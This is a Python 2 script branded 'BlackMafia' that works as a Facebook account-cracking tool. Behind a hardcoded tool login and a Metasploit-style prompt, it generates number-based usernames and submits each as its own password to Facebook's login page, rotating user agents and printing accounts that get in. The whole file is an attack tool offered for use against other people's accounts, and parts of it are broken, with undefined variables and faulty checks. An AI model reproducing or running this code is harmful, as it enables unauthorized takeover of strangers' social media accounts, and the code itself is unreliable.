#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.0001)
#########{colors}################
basic_green 	=	"\033[0;32m"
green			=	"\033[1;32m"
green_underline	=	"\033[4;32m"
basic_yellow	=	"\033[0;33m"
yellow 			=	"\033[1;33m"
white			=	"\033[0;37m"
whiteb			=	"\033[1;37m"
basic_red		=	"\033[0;31m"
red				=	"\033[1;31m"
cyan			=	"\033[1;36m"
basic_cyan		=	"\033[0;36m"
blue			=	"\033[1;34m"
basic_blue		=	"\033[0;34m"
light_blue		=	"\033[0;94m"
blue_underline	=	"\033[4;34m"
default			=	"\033[0m"   
underline		=	"\033[4;32m"
r               =   "\033[1;31m"
g               =   "\033[1;32m"
y               =   "\033[1;33m"
b               =   "\033[1;34m"
c               =   "\033[1;36m"
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:love_hacker
##### LOGO #####
logo = """
\033[1;97m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
\033[1;97m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
\033[1;97m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
\033[1;97m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
\033[1;97m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
\033[1;97m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;94m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
\033[1;94m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
\033[1;94m██╔████╔██║███████║█████╗░░██║███████║
\033[1;94m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
\033[1;94m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
\033[1;97m:•◈•╔╗─────────╔╗───────╔╗
\033[1;97m:•◈•║║─────────║║───────║║
\033[1;97m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
\033[1;97m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   
\033[1;97m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    
\033[1;97m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;94m╔══╗╔╗──────╔╗─╔═╗╔═╗───╔═╗
\033[1;94m║╔╗║║║──────║║─║║╚╝║║───║╔╝
\033[1;94m║╚╝╚╣║╔══╦══╣║╔╣╔╗╔╗╠══╦╝╚╦╦══╗
\033[1;94m║╔═╗║║║╔╗║╔═╣╚╝╣║║║║║╔╗╠╗╔╬╣╔╗║
\033[1;94m║╚═╝║╚╣╔╗║╚═╣╔╗╣║║║║║╔╗║║║║║╔╗║
\033[1;94m╚═══╩═╩╝╚╩══╩╝╚╩╝╚╝╚╩╝╚╝╚╝╚╩╝╚╝
\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
jalan('\033[1;94m=10%')
jalan("\033[1;94m==20%")
jalan('\033[1;94m===30%')
jalan('\033[1;94m====40%')
jalan("\033[1;94m=====50%")
jalan("\033[1;94m======60%")
jalan('\033[1;94m=======70%')
jalan('\033[1;94m========80%')
jalan('\033[1;94m=========90%')
jalan('\033[1;94m==========100%')
print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "Testing"
CorrectPassword = "lovehacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;94mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;94mTool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def available_facebook_motah():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'available_facebook_motah'+default+') > '))
  if  amerr[:10] == "set nomber" or  amerr[:10] == "set NOMBER" :
     nomber[0] = amerr[11:]
     print "NOMBER => ", nomber[0]
     available_facebook_motah()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (available_facebook_motah):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        NOMBER    "+nomber[0]+"                   yes           NOMBER "
   print ""
   print ""
   available_facebook_motah()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    kk = str(nomber[0])
    print blue +"[*]"+default+"starting cracking"
    print ""
    def motah():
     
     #email = str(raw_input("email"))
     email = str(random.randint(11111111,99999999))
     go = kk + email
     #password = str(raw_input("bass" ))
     password = str(random.randint(11111111,99999999))
     login = 'https://www.facebook.com/login.php?login_attempt=1'
     useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
     basss = random.randint(1111111,9999999)
     br = mechanize.Browser()
     amer = cookielib.LWPCookieJar()
     br.set_handle_robots(False)
     br.set_handle_redirect(True)
     br.set_cookiejar(amer)
     br.set_handle_equiv(True)
     # br.set_handle_referer(True)
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr = 0)
     br.form['email'] = go
     br.form['pass'] = go
     sub = br.submit()
     log = sub.geturl()
     print b,"[*]Check===> ",r,go
     if "https://www.facebook.com/checkpoint/?next" in log :
       print g,"[*]good ---------> ",c,go
     elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
       print ""
     elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
      print ""
     else :
       print y,"--------------------------------"
       print g,"[*]email ---------> ",g,go
       print g,"[*]pass ---------> ",g,go
       print y,"--------------------------------"
     motah()
  elif amerr[:2] == 'exit':
	 exit()
 except KeyboardInterrupt:
    raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
    available_facebook_motah()
    if __name__ == '__main__':
    	main()
